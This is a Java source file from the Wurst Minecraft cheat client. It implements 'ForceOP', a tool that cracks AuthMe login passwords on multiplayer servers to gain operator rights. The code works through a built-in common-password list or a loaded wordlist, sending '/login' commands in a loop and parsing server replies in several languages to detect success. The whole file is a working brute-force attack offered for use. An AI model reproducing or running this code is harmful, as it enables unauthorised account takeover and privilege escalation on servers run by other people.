/*
 * Copyright (C) 2014 - 2020 | Alexander01998 | All rights reserved.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package net.wurstclient.hacks;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.List;

import javax.swing.JCheckBox;
import javax.swing.UIManager;

import net.wurstclient.Category;
import net.wurstclient.SearchTags;
import net.wurstclient.events.ChatInputListener;
import net.wurstclient.hack.DontSaveState;
import net.wurstclient.hack.Hack;
import net.wurstclient.util.ChatUtils;
import net.wurstclient.util.ForceOpDialog;
import net.wurstclient.util.MultiProcessingUtils;

@SearchTags({"Force OP", "AuthMe Cracker", "AuthMeCracker", "auth me cracker",
	"admin hack", "AuthMe password cracker"})
@DontSaveState
public final class ForceOpHack extends Hack implements ChatInputListener
{
	private final String[] defaultList = {"password", "passwort", "password1",
		"passwort1", "password123", "passwort123", "pass", "pw", "pw1", "pw123",
		"hallo", "Wurst", "wurst", "1234", "12345", "123456", "1234567",
		"12345678", "123456789", "login", "register", "test", "sicher", "me",
		"penis", "penis1", "penis123", "minecraft", "minecraft1",
		"minecraft123", "mc", "admin", "server", "yourmom", "tester", "account",
		"creeper", "gronkh", "lol", "auth", "authme", "qwerty", "qwertz",
		"ficken", "ficken1", "ficken123", "fuck", "fuckme", "fuckyou"};
	private String[] passwords = {};
	
	private boolean gotWrongPWMSG;
	private int lastPW;
	
	private Process process;
	
	public ForceOpHack()
	{
		super("ForceOP", "Cracks AuthMe passwords. Can be used to get OP.");
		setCategory(Category.CHAT);
		
		try
		{
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		}catch(Exception e)
		{
			e.printStackTrace();
		}
	}
	
	@Override
	public void onEnable()
	{
		try
		{
			process = MultiProcessingUtils.startProcessWithIO(
				ForceOpDialog.class, MC.getSession().getUsername());
			
			new Thread(() -> handleDialogOutput(), "ForceOP dialog output")
				.start();
			
		}catch(IOException e)
		{
			throw new RuntimeException(e);
		}
		
		EVENTS.add(ChatInputListener.class, this);
	}
	
	private void handleDialogOutput()
	{
		try(BufferedReader bf =
			new BufferedReader(new InputStreamReader(process.getInputStream(),
				StandardCharsets.UTF_8)))
		{
			for(String line = ""; (line = bf.readLine()) != null;)
				messageFromDialog(line);
			
			setEnabled(false);
			
		}catch(IOException e)
		{
			e.printStackTrace();
		}
	}
	
	private void messageFromDialog(String msg)
	{
		if("start".equals(msg))
		{
			new Thread(this::runForceOP, "ForceOP").start();
			return;
		}
		
		if(msg.startsWith("list "))
		{
			loadPwList(msg.substring(5));
			sendNumPwToDialog();
		}
	}
	
	private void loadPwList(String list)
	{
		if("default".equals(list))
		{
			passwords = defaultList;
			return;
		}
		
		try
		{
			List<String> loadedPWs =
				Files.readAllLines(Paths.get(list), StandardCharsets.UTF_8);
			passwords = loadedPWs.toArray(new String[loadedPWs.size()]);
			
		}catch(IOException e)
		{
			e.printStackTrace();
			passwords = defaultList;
		}
	}
	
	private void sendNumPwToDialog()
	{
		String numPW = "numPW " + (passwords.length + 1);
		PrintWriter pw = new PrintWriter(process.getOutputStream());
		pw.println(numPW);
		pw.flush();
	}
	
	@Override
	public void onDisable()
	{
		EVENTS.remove(ChatInputListener.class, this);
		
		if(process != null)
			try
			{
				process.destroyForcibly();
				process.waitFor();
				
			}catch(InterruptedException e)
			{
				throw new RuntimeException(e);
			}
	}
	
	private void runForceOP()
	{
		MC.player.sendChatMessage("/login " + MC.getSession().getUsername());
		lastPW = 0;
		// update();
		for(int i = 0; i < passwords.length; i++)
		{
			if(!isEnabled())
				return;
			JCheckBox cbDontWait = new JCheckBox();
			if(!cbDontWait.isSelected())
				gotWrongPWMSG = false;
			while(!cbDontWait.isSelected() && !hasGotWrongPWMSG()
				|| MC.player == null)
			{
				if(!isEnabled())
					return;
				try
				{
					Thread.sleep(50);
				}catch(InterruptedException e)
				{
					e.printStackTrace();
				}
				
				// If you get kicked, it won't wait for "Wrong password!".
				if(MC.player == null)
					gotWrongPWMSG = true;
			}
			try
			{
				int forceOPDelay = 1000;
				Thread.sleep(forceOPDelay);
			}catch(InterruptedException e)
			{
				e.printStackTrace();
			}
			boolean sent = false;
			while(!sent)
				try
				{
					MC.player.sendChatMessage("/login " + passwords[i]);
					sent = true;
				}catch(Exception e)
				{
					try
					{
						Thread.sleep(50);
					}catch(InterruptedException e1)
					{
						e1.printStackTrace();
					}
				}
			lastPW = i + 1;
			// update();
		}
		ChatUtils.message("\u00a7c[\u00a74\u00a7lFAILURE\u00a7c]\u00a7f All "
			+ (lastPW + 1) + " passwords were wrong.");
	}
	
	@Override
	public void onReceivedMessage(ChatInputEvent event)
	{
		String message = event.getComponent().asString();
		if(message.startsWith("\u00a7c[\u00a76Wurst\u00a7c]\u00a7f "))
			return;
		if(message.toLowerCase().contains("wrong")// English
			|| message.toLowerCase().contains("falsch")// Deutsch!
			|| message.toLowerCase().contains("incorrect")// English
			|| message.toLowerCase().contains("mauvais")// French
			|| message.toLowerCase().contains("mal")// Spanish
			|| message.toLowerCase().contains("sbagliato")// Italian
		)
			gotWrongPWMSG = true;
		else if(message.toLowerCase().contains("success")// English & Italian
			|| message.toLowerCase().contains("erfolg")// Deutsch!
			|| message.toLowerCase().contains("succ\u00e8s")// French
			|| message.toLowerCase().contains("\u00e9xito")// Spanish
		)
		{
			String password;
			if(lastPW == -1)
				return;
			else if(lastPW == 0)
				password = MC.getSession().getUsername();
			else
				password = passwords[lastPW - 1];
			ChatUtils.message(
				"\u00a7a[\u00a72\u00a7lSUCCESS\u00a7a]\u00a7f The password \""
					+ password + "\" worked.");
			setEnabled(false);
		}else if(message.toLowerCase().contains("/help")
			|| message.toLowerCase().contains("permission"))
			ChatUtils.warning("It looks like this server doesn't have AuthMe.");
		else if(message.toLowerCase().contains("logged in")
			|| message.toLowerCase().contains("eingeloggt")
			|| message.toLowerCase().contains("eingelogt"))
			ChatUtils.warning("It looks like you are already logged in.");
	}
	
	private boolean hasGotWrongPWMSG()
	{
		return gotWrongPWMSG;
	}
}
